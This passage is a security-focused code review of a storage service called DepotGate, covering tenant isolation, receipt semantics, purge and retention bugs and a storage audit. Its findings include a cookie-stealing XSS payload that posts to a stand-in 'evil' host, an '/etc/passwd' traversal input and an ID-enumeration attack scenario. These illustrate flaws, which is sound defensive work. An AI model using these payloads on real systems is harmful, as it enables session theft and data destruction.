<!-- Generated 2026-08-15. Stack-level context: ../LV_STACK_REVIEW.md -->

> **Review 2 — DepotGate**
> Part of a full-stack review of LV_Stack (11 repos, ~97k LOC) conducted 2026-08-15.
> Stack-wide findings that affect this repo but are not fixable inside it are in
> `../LV_STACK_REVIEW.md` and `../_CROSS_REPO_ANALYSIS.md`. Read the stack report first —
> several findings below have a shared root cause.

---

# DepotGate — Code Review

Reviewed at `/home/claude/lv/DepotGate/` (~5.2k LOC incl. tests). Sources read: `README.md`,
`DepotGate v0 spec.txt`, `CODE_REVIEW_1.md`, `Below is a comprehensive code revie.txt`,
`Untitled.txt`, `.claude/SECURITY_PUNCHLIST.md`, `/home/claude/lv/LegiVellum/docs/canonical/DepotGate/`,
`receipt.schema.v1.json`, `receipt.rules.md`, all of `src/`, `tests/`, `init-db.sql`,
`Dockerfile`, `docker-compose.yml`, `pyproject.toml`, `.github/workflows/ci.yml`.
Dependencies are not installed in this environment, so nothing was executed except
`compileall` (clean) and standalone regex reproduction.

## Verdict

DepotGate stores bytes for a multi-principal system while having **no concept of a principal
and no per-request tenant** — `tenant_id` is a process-wide constant (`config.py:30`,
`staging.py:67`) and auth is one shared API key (`auth.py:22`), so any credential holder can
list, read the pointers of, ship, and *destroy* any other caller's artifacts by guessing a
`root_task_id` string. Worse for the mesh: every receipt DepotGate emits is
`phase="complete"` stamped on `task_id = root_task_id` (`legivellum_receipts.py:112-129`), and
`receipt.rules.md` §4 derives "Resolved" from exactly that — so staging an artifact, or
purging one, silently closes the caller's root obligation in ReceiptGate. DepotGate never
emits `accepted` at all, violating core invariant 2. Add a receipt-payload "sanitizer" that
regex-destroys every UUID, hash, MIME type and location it stores (`core/receipts.py:53-54`),
a purge path that hard-deletes bytes before the metadata transaction commits
(`shipping.py:262-266`), retention policies that hide artifacts *immediately* and never delete
the bytes, an HTTP sink that can never validate its own destination (`sinks/factory.py:51-58`
vs `sinks/http.py:105-113`), closure requirements that are unreachable from the only exposed
transport, `docker-compose up` that cannot start because of its own config validators, no
migration tool, and zero tests for auth, traversal or tenant isolation. Not v1-taggable; this
is the furthest from v1 of the gates reviewed so far.

Credit where due: the two path-traversal BLOCKERs from `SECURITY_PUNCHLIST.md` are genuinely
fixed, and the Docker non-root fix landed.

## Exit Criteria Scorecard

Scored against `/home/claude/lv/Gate v1 Exit Criteria Template.txt`.

| § | Section | Score | Justification |
|---|---|---|---|
| 1 | Build & Run | **FAIL** | No `run_local.sh`/`.ps1`/Makefile (siblings have them); `docker-compose up` cannot start — compose sets `POSTGRES_PASSWORD: depotgate` which `config.py:215` rejects as an insecure default and sets no `DEPOTGATE_API_KEY`, which `config.py:190` also rejects; no HTTP health endpoint (health is an MCP tool behind auth) and no container healthcheck. `.env.example` and Dockerfile are present and fine. |
| 2 | API & Contract Stability | **PARTIAL** | MCP-only, correctly namespaced, legacy aliases handled deliberately; but `_jsonrpc_error` emits a **string** `code` (`mcp/routes.py:309`), raw exception text is returned to callers (`mcp/routes.py:384`), and the headline `requirements` field of `DeliverableSpec` is not exposed by `declare_deliverable`'s schema at all (F-9). |
| 3 | Canonical Principals | **FAIL** | No `SYSTEM_PRINCIPAL_ID`, no `owner_principal_id`, no caller principal anywhere in the codebase (grep: zero hits for `sys:legivellum`/`owner_principal`). Every receipt is self-addressed `from=for=recipient="svc:depotgate"` (`legivellum_receipts.py:56,120-124`), never to the obligation owner. |
| 4 | Receipt Model Invariants | **FAIL** | No `accepted` receipt is ever emitted (invariant 2). No `TERMINAL_RECEIPT_TYPES` set. `complete` receipts are stamped on the caller's `root_task_id` and therefore close foreign obligations (F-2). Canonical validation silently disables itself in the shipped container (F-6). |
| 5 | Persistence & Migration | **FAIL** | `init-db.sql` creates two empty databases and nothing else; schema comes from `create_all()` at startup (`db/connection.py:36-42`). `alembic` is a declared dependency (`pyproject.toml:23`) with no `alembic/` directory, no `alembic.ini`, no migration, no upgrade path. Siblings use alembic; this repo is the outlier. |
| 6 | Core Behavioral Guarantees | **PARTIAL** | stage → declare → check_closure → ship → purge works against the filesystem sink, but the HTTP sink can never pass its own validation (F-8), `receipt_phase` closure is a stub that always passes (F-10), concurrent `ship` double-delivers (F-11), and there is no golden-path demo script. |
| 7 | Test Requirements | **FAIL** | 7 test files (task brief said 8; `tests/__init__.py` is the eighth), 7 `@pytest.mark.skip(reason="Requires database connection")`. Every staging/closure/ship/purge path is skipped. Zero tests for auth (conftest forces `ALLOW_INSECURE_DEV=true` globally, `conftest.py:23`), zero for path traversal, zero for tenant isolation, zero for size limits. None of the template's required regressions exist. |
| 8 | Observability | **FAIL** | `core/staging.py`, `core/shipping.py`, `core/deliverables.py`, `core/receipts.py` contain **no logging at all**. No correlation keys, no metrics, no "what's going on" query path beyond per-task listing. Failures are converted to opaque strings by a blanket `except Exception` (`mcp/routes.py:383`). |
| 9 | v1 Lock Rules | **FAIL** | Tagging v1 freezes: tenant-as-static-config, self-addressed receipts, `complete`-on-root-task semantics, and a DB schema with no migration tool. All four are semver-breaking to fix afterwards. |
| 10 | Open Issues / Deferred | **FAIL** | No `V1_EXIT_CRITERIA.md` (siblings have one). Instead: three unstructured review docs, one literally named `Untitled.txt` — which is not a review at all but a **normative spec** ("Status: Normative (LegiVellum v1.1 alignment)") whose §4 API surface (`depot.resolve`/`fetch`/`ingest_from`/`stat`) is 0% implemented and whose §6.1 tenant-isolation rule is violated. |

## Storage Security Audit

| Surface | file:line | Control present? |
|---|---|---|
| Traversal via `tenant_id`/`root_task_id` into storage path | `storage/filesystem.py:37,50-52` | **Yes** — `re.sub(r'[/\\.]+','_')` + 200-char cap. Fixed since punchlist BLOCK-001. |
| Traversal via `location` string on read/delete | `storage/filesystem.py:62-71` | **Yes** — `.resolve()` + `relative_to(base.resolve())`. Absolute `fs:///etc/passwd` also caught. |
| Null bytes / unicode in path components | `storage/filesystem.py:37` | **No** — `\x00` is not in the strip set; reaches `aiofiles.open` (raises `ValueError`, surfaces as a raw error string). Distinct task IDs also collide (`a.b` and `a/b` both → `a_b`), harmless only because the leaf is a UUID. |
| Traversal via shipping `destination` | `sinks/filesystem.py:45-59` | **Yes** — absolute paths allowed only if they resolve under `base_path`; `..` stripped. Fixed since BLOCK-002. |
| Access control on read: A reads B's artifact | `staging.py:195-201`, `auth.py:22` | **No** — predicate is `tenant_id == settings.tenant_id`, a process constant. One shared API key, no principal. **F-1.** |
| Artifact IDs unguessable | `staging.py:70` | Yes (`uuid4`) — but irrelevant: `list_staged_artifacts(root_task_id)` enumerates by a caller-chosen *string*, which is guessable. |
| Tenant predicate in the query (not just the caller) | `staging.py:148-151`, `deliverables.py:100-103` | Yes structurally — but the value is constant, so it isolates nothing. |
| Presigned / direct URLs | — | N/A — not implemented. `Untitled.txt` §4.1 requires `signed_url` resolution; absent. |
| Content-Type / Content-Disposition on served bytes | — | N/A — **DepotGate never serves artifact bytes.** No download tool exists; `retrieve_content` (`staging.py:222`) is only called by the ship path. `nosniff`/CSP absent but no HTML is served. |
| Attacker-chosen file extension in shipped output | `sinks/filesystem.py:84-85,115-132` | **No** — client-supplied `mime_type` maps to `.html`/`.svg`/`.js`; if the shipped dir is ever web-served, that is stored XSS. **F-13.** |
| Upload size bound | `mcp/routes.py:394`, `storage/filesystem.py:100-108` | **Partial/ineffective** — the whole base64 body is read and decoded into RAM *before* the size check. **F-4.** |
| Decompression bombs | — | N/A by design (spec forbids inspecting content). No archive expansion anywhere. Correct. |
| Per-tenant quota / disk accounting | — | **No** — unlimited artifacts × 100 MB each, only IP rate limiting (200/min). |
| SSRF on ingest | — | N/A — no remote-URL ingest (`Untitled.txt` §4.3 `ingest_from` unimplemented). |
| SSRF on egress (HTTP sink) | `sinks/http.py:94-103` | **Yes, over-tight** — allowlist defaults to empty ⇒ deny-all. Combined with F-8 the sink is unreachable regardless. |
| Redirect following on egress | `sinks/http.py:40,67` | **No** — `httpx.AsyncClient` default `follow_redirects=False`, so OK by accident; timeout is set (good). |
| Secrets in stored receipts | `core/receipts.py:49-64` | Present but catastrophically over-broad. **F-3.** |

## Artifact Lifecycle & GC Analysis

**There is no GC.** No background job, no scheduler, no retention sweeper exists in the repo
(`grep` for cron/scheduler/APScheduler: zero hits). Lifecycle is entirely caller-driven via
`depotgate.purge`.

- **Reference counting: none.** `ShippingService.purge()` (`shipping.py:226-292`) takes a
  `root_task_id` and deletes *everything* staged under it. It never checks whether a
  `DeliverableRecord` in `pending` status references those artifact IDs, whether a
  `ShipmentRecord` manifest embeds them, or whether an emitted receipt's `artifact_refs`
  points at them. Deletion is caller-time-based only.
- **Retention policies are inverted.** `shipping.py:268-274`: `retain_24h` and `retain_7d`
  call `mark_purged()` *immediately*, which sets `purged_at=now`, which removes the artifact
  from every read path (`staging.py:157,200`, `deliverables.py:249`). The bytes are then never
  deleted, because the "scheduled job" the comment defers to does not exist. So "retain for 7
  days" means *invisible in under a second, on disk forever*. `manual` behaves identically.
  Only `immediate` deletes bytes.
- **Soft vs hard delete is split across the two stores.** `immediate` hard-deletes the bytes
  and soft-deletes the row, leaving a permanent row whose `location` column points at a file
  that no longer exists, with no tombstone flag distinguishing "purged" from "expired".
- **Delete is idempotent, but silently.** A second purge finds no live artifacts and returns
  `[]` at `shipping.py:257-258` *before* emitting a receipt — so a repeat purge produces no
  audit record at all.
- **Immutability:** artifacts are keyed by `uuid4` and never rewritten through the MCP surface,
  so the append-only claim holds *today*. `StagingArea.stage_artifact` does accept a caller
  `artifact_id` (`staging.py:48`); it is not plumbed to MCP, but if it ever is, restaging an
  existing ID reopens the same path `"wb"` (`storage/filesystem.py:107`) and silently replaces
  the bytes while the DB insert fails on the primary key — content replaced, hash stale.
- **Orphans:** bytes are written at `staging.py:73` and the row is added at `staging.py:107`;
  the commit happens later in the FastAPI dependency (`db/connection.py:57`). Any failure in
  between orphans the file permanently — nothing ever scans the staging tree for files with no
  row.

## Critical & High Findings

### F-1 (CRITICAL) — No principal, no per-request tenant: any credential holder can read and destroy any other caller's artifacts

`src/depotgate/auth.py:36-72` is the entire authorization model — one shared key, no identity
extracted, returns `True`. The tenant predicate is then a process constant:

```python
# src/depotgate/core/staging.py:67
tenant_id = tenant_id or settings.tenant_id
# src/depotgate/core/staging.py:195-201
tenant_id = tenant_id or settings.tenant_id
query = select(ArtifactRecord).where(
    ArtifactRecord.artifact_id == artifact_id,
    ArtifactRecord.tenant_id == tenant_id,
```

`config.py:30`: `tenant_id: str = Field(default="default")`. No MCP handler reads a caller
identity; `X-Tenant-ID` appears only in the CORS allowlist (`config.py:132`) and is never read.

**Attacker capability:** possession of the single `DEPOTGATE_API_KEY` — i.e. *any* legitimate
gate in the mesh (CogniGate, AsyncGate workers, DeleGate) or anyone who obtains the key once.

**Failure scenario:** caller A stages the final deliverable for `root_task_id="task-1042"`.
Caller B calls `depotgate.list_staged_artifacts{"root_task_id":"task-1042"}` and receives every
artifact's `location`, `content_hash`, `size_bytes`, `mime_type` and `produced_by_receipt_id`
(`mcp/routes.py:456-476` — this listing was deliberately widened to include location and hash).
B then calls `depotgate.purge{"root_task_id":"task-1042","policy":"immediate"}` and A's bytes
are gone. `root_task_id` is a caller-chosen opaque string, so it is enumerable by guessing
(`task-1`, `task-2`, …) — the `uuid4` artifact IDs provide no protection because the listing
is keyed by the guessable string. Directly violates `receipt.rules.md` §3.1 ("MUST extract
`tenant_id` from auth tokens") and `Untitled.txt` §6.1/§6.2.

### F-2 (CRITICAL) — Every DepotGate receipt is a `complete` on the caller's root task, silently closing someone else's obligation

```python
# src/depotgate/legivellum_receipts.py:112-129 (via _build_receipt)
"task_id": task_id,          # == root_task_id at every call site
"phase": phase,              # "complete" for all four builders
"status": status,            # "success" / "failure"
```

All four builders pass `task_id=root_task_id` with `phase="complete"`
(`legivellum_receipts.py:191-192, 249-250, 311-312, 371-372`). `receipt.rules.md` §4:
*"Resolved: A `complete` receipt exists for `task_id` (within the same `tenant_id`)"*, and §1.2:
*"A `complete` receipt MUST resolve the obligation created by the corresponding `accepted`
receipt for the same `task_id`."*

**Failure scenario:** DeleGate mints an obligation `accepted` for `task_id="task-1042"`. A
worker stages an *intermediate* artifact mid-run: `depotgate.stage_artifact{"root_task_id":
"task-1042", "artifact_role":"intermediate"}`. DepotGate emits
`phase=complete, status=success, task_id=task-1042` to ReceiptGate. Any consumer deriving state
per §4 — InterView's inbox, ReceiptGate's terminator logic, DeleGate's child tracking — now sees
`task-1042` as **resolved successfully**, while the work is still running. `purge` does the
same. `shipment_rejected` emits `phase=complete, status=failure` on the root task, closing it as
*failed* on a mere closure-check miss. DepotGate is a side-effect service; it should be minting
its own `task_id` for its own obligation and linking provenance via `caused_by_receipt_id`, not
writing terminal receipts into someone else's task lineage.

Compounding: `caused_by_receipt_id=None` is hardcoded for shipment and purge receipts
(`shipping.py:120, 188, 288`), so those receipts carry `"NA"` and the causality chain
(invariant 4) is broken exactly where it would have disambiguated this.

### F-3 (HIGH) — The receipt "sanitizer" destroys every identifier, hash, location and MIME type it stores

```python
# src/depotgate/core/receipts.py:53-54
value = re.sub(r"/[A-Za-z0-9._\-/]+", "[PATH]", value)
value = re.sub(r"[A-Za-z0-9_\-]{32,}", "[REDACTED_TOKEN]", value)
```

Reproduced standalone:

| input | stored |
|---|---|
| `550e8400-e29b-41d4-a716-446655440000` | `[REDACTED_TOKEN]` |
| `fs://default/task-123/550e8400-…` | `fs:[PATH]` |
| `application/json` | `application[PATH]` |
| `e3b0c442…7852b855` (sha256) | `[REDACTED_TOKEN]` |

A UUID string is 36 chars of `[A-Za-z0-9-]`, so it matches the 32+ "token" rule. Every
`artifact_id`, `deliverable_id`, `manifest_id`, `content_hash`, `location` and `mime_type` in
`payload_json` is annihilated.

**Failure scenario:** an auditor queries the receipts DB for the `artifact_staged` receipt of a
disputed deliverable. Every payload row reads
`{"artifact_id":"[REDACTED_TOKEN]","location":"fs:[PATH]","content_hash":"[REDACTED_TOKEN]",
"mime_type":"application[PATH]"}`. The local receipt ledger — the thing the README calls
"Immutable event record for auditability" — proves nothing about which artifact was staged.
The redaction is applied only to the *local* store, not to what is sent to ReceiptGate
(`receipt_emitter.py` builds a separate payload), so the two ledgers now disagree by
construction. Direct regression introduced by `SECURITY_PUNCHLIST.md` MED-003, whose sample
code this is.

### F-4 (HIGH) — Unbounded request body: the size limit is enforced after the whole artifact is in RAM

```python
# src/depotgate/mcp/routes.py:392-394
import base64
content = base64.b64decode(args["content_base64"])
```

Starlette buffers the entire JSON body before `MCPRequest` is constructed; there is no
`Content-Length` guard, no `max_request_size`, and no streaming path. The
`storage_max_artifact_size_mb` check does not run until `storage/filesystem.py:101-104`, by
which point the process holds the base64 string *and* the decoded bytes.

**Failure scenario:** one authenticated POST with a 2 GB `content_base64` string costs ~2 GB
(str) + ~1.5 GB (bytes) + the ASGI buffer before the 100 MB limit rejects it. Rate limiting
allows 200 such requests per minute per IP (`config.py:151`). Container OOM, all in-flight
staging transactions lost. `b64decode` is also called without `validate=True`, so garbage
characters are silently dropped rather than rejected — a corrupted upload is stored and hashed
as if intact. The prior review ("Below is a comprehensive code revie.txt" finding 1) raised
exactly this for the REST path; the MCP path inherited it.

### F-5 (HIGH) — Purge hard-deletes bytes before the metadata transaction commits; failure leaves live rows with no bytes

```python
# src/depotgate/core/shipping.py:262-266
if policy == PurgePolicy.IMMEDIATE:
    await self.staging.delete_artifact_content(purged_ids, tenant_id)
    await self.staging.mark_purged(purged_ids, tenant_id)
```

`delete_artifact_content` (`staging.py:310-316`) unlinks files in a loop with no transaction.
`mark_purged` only `flush()`es; the commit happens later in the request dependency
(`db/connection.py:57`). Any exception between the first unlink and the commit is swallowed by
`mcp/routes.py:383-384` and returned as `success:false`.

**Failure scenario:** purge of 50 artifacts; the disk goes read-only (or a permission error
fires) after 20 unlinks. `aiofiles.os.remove` raises `OSError`, no row is marked purged, the
metadata session is rolled back — and 20 artifacts now have live rows whose `location` points
at deleted files. `check_closure` still reports them as staged, `ship` selects them, and
`retrieve_content` raises `FileNotFoundError` mid-shipment after some artifacts have already
been written to the sink. There is no reconciliation job and no hash re-verification on read
(`storage/filesystem.py:132-140` returns bytes without checking `content_hash`).

The mirror case exists on ingest: bytes at `staging.py:73`, row at `staging.py:107`, commit
later — a DB failure in between orphans the file forever.

### F-6 (HIGH) — Canonical receipt validation silently disables itself in the shipped container

```python
# src/depotgate/legivellum_receipts.py:157-160
if CanonicalReceipt is None:
    return payload
return CanonicalReceipt.model_validate(payload).model_dump(mode="json")
```

`legivellum` is not in `pyproject.toml` dependencies; the fallback walks parent directories for
`LegiVellum/shared` (`legivellum_receipts.py:23-33`). The `Dockerfile` copies only
`pyproject.toml`, `README.md` and `src/` — there is no `LegiVellum` checkout inside the image.

**Failure scenario:** in the only supported deployment (`docker-compose up`), `CanonicalReceipt`
is always `None`, so every emitted receipt bypasses schema and phase-constraint validation. Any
future field-name drift produces payloads that ReceiptGate rejects at runtime; `emit_receipt`
catches everything (`receiptgate_client.py:48-49`), returns `False`, and `_emit`
(`receipt_emitter.py:113-119`) logs a warning and returns `None`. The receipt is lost with no
retry, no buffer and no error to the caller — while the MCP call returns `success:true`. In a
system where "receipts are the sole protocol", the write path is fire-and-forget. (AsyncGate
solved this with a durable ReceiptGate buffer; DepotGate has none.)

### F-7 (HIGH) — Retention policies are inverted: `retain_7d` hides the artifact instantly and keeps the bytes forever

```python
# src/depotgate/core/shipping.py:268-274
elif policy in (PurgePolicy.RETAIN_24H, PurgePolicy.RETAIN_7D):
    # Just mark as purged (content cleanup would be done by scheduled job)
    await self.staging.mark_purged(purged_ids, tenant_id)
elif policy == PurgePolicy.MANUAL:
    await self.staging.mark_purged(purged_ids, tenant_id)
```

`mark_purged` sets `purged_at=now` (`staging.py:286`) and every read path filters
`purged_at.is_(None)`.

**Failure scenario:** an operator ships a deliverable and calls
`purge{"policy":"retain_7d"}` intending a 7-day grace window for re-shipment. The artifacts
vanish from `list_staged_artifacts` and `check_closure` **immediately**; a re-ship one hour
later fails closure and marks the deliverable `rejected`. Meanwhile the bytes are never
removed — there is no scheduled job in the repo — so the disk grows without bound. Both halves
of the policy are wrong, in opposite directions. `manual` ("Never auto-delete") also
soft-deletes on the spot, which contradicts its own docstring.

### F-8 (HIGH) — The HTTP sink can never validate its own destination; `http://` shipping is dead on arrival

```python
# src/depotgate/sinks/factory.py:51-58
if "://" in destination:
    parts = destination.split("://", 1)
    sink_type = parts[0]
    dest_path = parts[1]
```

`shipping.py:136-140` then calls `sink.validate_destination(dest_path)` — with the **scheme
stripped**:

```python
# src/depotgate/sinks/http.py:107-113
parsed = urlparse(destination)
if parsed.scheme not in settings.sink_http_allowed_schemes:
    return False
```

**Failure scenario:** declare a deliverable with
`shipping_destination="http://hooks.internal/webhook"`. The factory yields
`(HttpSink, "hooks.internal/webhook")`. `urlparse("hooks.internal/webhook").scheme == ""`,
which is not in `["http","https"]`, so validation returns `False` and `ship` raises
`ShippingError("Invalid destination: …")` — *unconditionally, for every HTTP destination, even
a correctly allowlisted one*. `tests/test_sinks.py:132-134` asserts the factory's stripping
behaviour and never exercises `validate_destination`, so the tests certify the broken half.
Had validation passed, `client.post("hooks.internal/webhook", …)` would fail anyway for lack of
a scheme. Half of the documented sink surface (`README.md:154`) does not work.

Related: `settings.get_enabled_sinks()` / `get_enabled_sinks()` (`sinks/factory.py:79-82`) is
never called on the ship path, so `DEPOTGATE_ENABLED_SINKS` is decorative — sink selection is
driven purely by the destination string.

### F-9 (HIGH) — Closure `requirements` — the product's headline feature — cannot be declared over MCP

`DeliverableSpec.requirements` (`core/models.py:75`) drives the entire `child_task` /
`receipt_phase` closure machinery in `deliverables.py:225-300`. But the MCP tool schema for
`declare_deliverable` exposes only `root_task_id`, `artifact_ids`, `artifact_roles`,
`shipping_destination` (`mcp/routes.py:161-188`), and the handler constructs the spec without
it:

```python
# src/depotgate/mcp/routes.py:516-520
spec = DeliverableSpec(
    artifact_ids=artifact_ids,
    artifact_roles=artifact_roles,
    shipping_destination=args["shipping_destination"],
)
```

**Failure scenario:** an operator follows the v0 spec (lines 159-164: "Requirements MAY include
required child task IDs … required receipt phases") and tries to declare a deliverable that
must wait for child task `task-1042-b`. There is no argument for it; MCP is the only transport
(`README.md:34`, canonical `DepotGate/README.md`: "Transport: MCP only"). The deliverable ships
as soon as the listed artifacts exist. Same for `metadata`, which means `_resolve_principal`
(`legivellum_receipts.py:50-56`) can never see a client principal and always falls back to
`svc:depotgate`.

### F-10 (HIGH) — `receipt_phase` closure requirements always pass; `child_task` is a substring match

```python
# src/depotgate/core/deliverables.py:294-298
elif requirement.requirement_type == RequirementType.RECEIPT_PHASE:
    # For v0, receipt phase checks are simplified
    # For now, assume phase requirements are met if any artifacts exist
    return len(staged_artifacts) > 0

# src/depotgate/core/deliverables.py:289-292
return any(
    a.produced_by_receipt_id and requirement.value in a.produced_by_receipt_id
    for a in staged_artifacts
)
```

The v0 spec's Shipping Preconditions (lines 172-176) require "The parent obligation is
complete" and "All declared required child obligations are resolved". Neither is checked
against any receipt; the receipts DB is never queried by `DeliverableManager` (it holds
`receipts_session` at `deliverables.py:38` and never uses it).

**Failure scenario (if F-9 is fixed first):** a deliverable declares
`{"requirement_type":"receipt_phase","value":"complete"}`. One unrelated `intermediate`
artifact is staged. `check_closure` reports `all_met=true` and `ship` releases the deliverable
while the parent obligation is still open — the exact "premature delivery" failure the spec
says DepotGate exists to prevent. For `child_task`, requirement value `"task-1"` is satisfied by
any artifact whose `produced_by_receipt_id` merely *contains* `"task-1"`, e.g.
`"rcpt-for-task-1042"`. Raised as finding 5 in `Below is a comprehensive code revie.txt` and as
"Partial" in `CODE_REVIEW_1.md`; still open.

### F-11 (HIGH) — Concurrent `ship` double-delivers: no lock, no unique constraint, no status precondition

```python
# src/depotgate/core/shipping.py:99-100
if deliverable.status == "shipped":
    raise ShippingError(f"Deliverable {deliverable_id} already shipped")
```

The read at `deliverables.py:99-105` is a plain `SELECT` (no `FOR UPDATE`), the write is at
`deliverables.py:321-323`, and `ShipmentRecord` has no unique constraint on `deliverable_id`
(`db/models.py:67-80` — only `index=True`).

**Failure scenario:** an orchestrator retries a `ship` call that timed out at the client while
still running. Both requests read `status="pending"`, both pass closure, both write the full
artifact set to the sink under different `manifest_id` directories (`sinks/filesystem.py:77`),
both insert a `ShipmentRecord`, both set `status="shipped"`, and both emit a
`shipment_complete` receipt with different `dedupe_key`s (`legivellum_receipts.py:273`). The
customer receives the deliverable twice; the ledger records two successful shipments of one
deliverable. For a component whose stated purpose is "nothing leaves until the paperwork is
complete", uncontrolled double-release is a core-purpose defect.

## Medium Findings

### F-12 (MEDIUM) — Blanket `except Exception` returns raw internal error text and still commits the transaction

```python
# src/depotgate/mcp/routes.py:383-384
except Exception as exc:
    return MCPToolResult(success=False, error=str(exc))
```

Two problems. (a) Disclosure: `str(exc)` carries `"Path traversal attempt detected in location:
fs://…"`, SQLAlchemy `ProgrammingError` text including the failing SQL, and
`FileNotFoundError` with absolute container paths — to an unauthenticated-in-dev-mode caller.
(b) Because the exception never escapes the route handler, the session dependency's generator
resumes normally and `await session.commit()` runs (`db/connection.py:57`) — so a call that
reports `success:false` can still have committed a partial `mark_purged`, a `DeliverableRecord`,
or a `ShipmentRecord`. Reported as MED-004 in `CODE_REVIEW_1.md`; unfixed.

### F-13 (MEDIUM) — Shipped filenames take their extension from client-supplied `mime_type`

```python
# src/depotgate/sinks/filesystem.py:84-85
extension = self._get_extension(artifact.mime_type)
filename = f"{artifact.artifact_id}{extension}"
```

`_get_extension` maps `text/html → .html`, `image/svg+xml → .svg`, `text/javascript → .js`
(`sinks/filesystem.py:117-132`). **Attacker capability:** any API key holder.
**Failure scenario:** stage `<script>fetch('//evil/'+document.cookie)</script>` with
`mime_type="text/html"`, declare a deliverable to `filesystem://public`, ship. The bytes land
as `…/<uuid>.html` in the shipped tree. The v0 spec explicitly contemplates the shipped
directory being consumed by external systems; if anything web-serves it, this is stored XSS
with no `nosniff` anywhere in the stack. DepotGate cannot inspect content (correctly), which is
exactly why it should not be choosing extensions from an unvalidated client hint.

### F-14 (MEDIUM) — `dedupe_key` collisions can drop legitimate purge and rejection receipts

```python
# src/depotgate/legivellum_receipts.py:391
dedupe_key=f"purge:{root_task_id}:{policy.value}:{len(artifact_ids)}"
# src/depotgate/legivellum_receipts.py:331
dedupe_key=f"shipment_rejected:{deliverable_id}"
```

**Failure scenario:** a task purges 3 artifacts at 10:00 and 3 different artifacts at 14:00,
both `immediate`. Both receipts carry `dedupe_key="purge:task-1042:immediate:3"`. Per
`receipt.rules.md` §6, a ledger honouring `dedupe_key` drops the second — the afternoon
deletion of three artifacts has **no audit record**. Same for a deliverable rejected twice for
different unmet requirements. The key must include the receipt's own identity or a timestamp.

### F-15 (MEDIUM) — JSON-RPC error `code` is a string, and every error is HTTP 200

```python
# src/depotgate/mcp/routes.py:309
return _jsonrpc_error(request.id, "TOOL_ERROR", result.error or "Unknown error")
```

JSON-RPC 2.0 requires `error.code` to be an integer, and the same field carries `-32601`/`-32602`
elsewhere in the file (`routes.py:297,303`). A client that types `code` as `int` — the natural
reading, and what the method-not-found branch teaches it — raises on every tool failure. There
is also no error taxonomy: "artifact not found", "closure not met", "path traversal detected"
and "database unavailable" are indistinguishable. Exit Criteria §2 requires a consistent error
model. Same defect flagged in ReceiptGate and AsyncGate — a stack-wide pattern.

### F-16 (MEDIUM) — No idempotency on staging: retrying a timed-out upload silently duplicates the artifact

`staging.py:70` always mints a fresh `uuid4`; there is no unique constraint on
`(tenant_id, root_task_id, content_hash)` in `db/models.py:28-48`, and no
`idempotency_key`/`dedupe` argument in the `stage_artifact` tool schema
(`mcp/routes.py:95-123`).

**Failure scenario:** a worker's 90 MB upload times out client-side after the server has
committed. The worker retries. Two rows, two files, 180 MB on disk, two `artifact_staged`
receipts with different `dedupe_key`s, and a deliverable declared by `artifact_role` now ships
the payload twice. Exit Criteria §7 lists "dedupe behavior verified" as a required regression;
there is neither behaviour nor test.

### F-17 (MEDIUM) — Unbounded listings and unbounded shipment assembly

`list_artifacts` (`staging.py:148-162`), `_get_staged_artifacts`
(`deliverables.py:245-252`) and `list_deliverables` (`deliverables.py:139-150`) have no
`LIMIT` and no cursor. `ShippingService.ship` materialises every selected `ArtifactPointer`,
and `HttpSink.ship` (`sinks/http.py:44-64`) base64-encodes **every artifact's full content**
into a single in-memory JSON body before posting.

**Failure scenario:** a long-running task stages 200 000 artifacts;
`list_staged_artifacts` builds a 200 000-element response in one JSON-RPC reply. Or a
deliverable of 40 × 100 MB artifacts ships over HTTP: ~4 GB decoded + ~5.4 GB base64 + the
serialized body, in RAM, in one process. `ReceiptStore.list_receipts` is the only paginated
query (`core/receipts.py:92`, default 100) and it is not exposed over MCP at all.

### F-18 (MEDIUM) — `tenant_id` is not threaded through the ship path; multi-tenancy will fail closed the day it is added

```python
# src/depotgate/core/shipping.py:152-153
async def get_content(artifact_id: UUID) -> bytes:
    return await self.staging.retrieve_content(artifact_id)
```

`retrieve_content` (`staging.py:222-236`) takes no tenant and calls
`self.get_artifact(artifact_id)`, which defaults to `settings.tenant_id` — discarding the
`tenant_id` that `ship()` accepted at `shipping.py:70`. Latent today because the value is
always `"default"`.

**Failure scenario:** the moment F-1 is fixed and `ship(tenant_id="acme")` is called, every
artifact lookup filters on `"default"`, returns `None`, and `retrieve_content` raises
`ValueError("Artifact … not found")` — *after* `sink.ship` has already begun writing earlier
artifacts to the destination. Fails closed rather than leaking, but leaves partial shipments.

### F-19 (MEDIUM) — `docker-compose up` cannot start the service

`docker-compose.yml:29-40` sets `DEPOTGATE_POSTGRES_PASSWORD: depotgate` and no
`DEPOTGATE_API_KEY`/`DEPOTGATE_ALLOW_INSECURE_DEV`. Both validators reject this at import time:

```python
# src/depotgate/config.py:215-217
insecure_defaults = {"depotgate", "password", "changeme", "default"}
if not allow_insecure and password.lower() in insecure_defaults:
    raise ValueError("Insecure default postgres_password detected")
# src/depotgate/config.py:189-190
if not v and not allow_insecure:
    raise ValueError("api_key is required when allow_insecure_dev=False")
```

`settings = Settings()` runs at module import (`config.py:222`), so the container exits on
startup with a pydantic `ValidationError` before FastAPI is constructed. The README's Quick
Start (`README.md:11-16`) is therefore untested and wrong. There is also no `depotgate`
healthcheck in compose and no HTTP health route (health is an MCP tool behind
`Depends(verify_api_key)` at `mcp/routes.py:40`), so Exit Criteria §1's "Health endpoint
returns OK" has nothing to point at.

### F-20 (MEDIUM) — Schema: no migration story, `create_all` at runtime, no constraints

`init-db.sql` is 9 lines and creates only the two databases. Schema materialises via
`MetadataBase.metadata.create_all` on every startup (`db/connection.py:36-42`). `alembic>=1.13.0`
is declared (`pyproject.toml:23`) with no `alembic/`, `alembic.ini` or migration anywhere —
siblings (AsyncGate, ReceiptGate) use alembic properly. Exit Criteria §5 requires migrations
that run cleanly from an empty DB and a documented upgrade path; there is no mechanism at all.
Consequences already visible: `Enum(ArtifactRole)` (`db/models.py:40`) creates a PostgreSQL
enum type, so adding a fifth artifact role in v1.1 requires `ALTER TYPE` that nothing will
issue; `DateTime` columns are timezone-naive against `datetime.utcnow()` (10 call sites) while
`receipt.rules.md` §5 mandates tz-aware ISO-8601; no unique constraints anywhere; no index on
`purged_at` despite every read path filtering on it; `JSON` rather than `JSONB` for
`spec_json`/`manifest_json`/`payload_json`, so no GIN indexing.

## Low / Nits

- **L-1** `src/depotgate/core/staging.py:68-70` — dead, confusing code that reads like a bug:
  `artifact_id = artifact_id or UUID(int=0).int` followed by
  `artifact_id = artifact_id if isinstance(artifact_id, UUID) else uuid4()`. The first line is
  a no-op whose only effect is to make the second necessary. Also two inline
  `from uuid import uuid4` imports (`staging.py:69`, `deliverables.py:60`) — MED-003 in
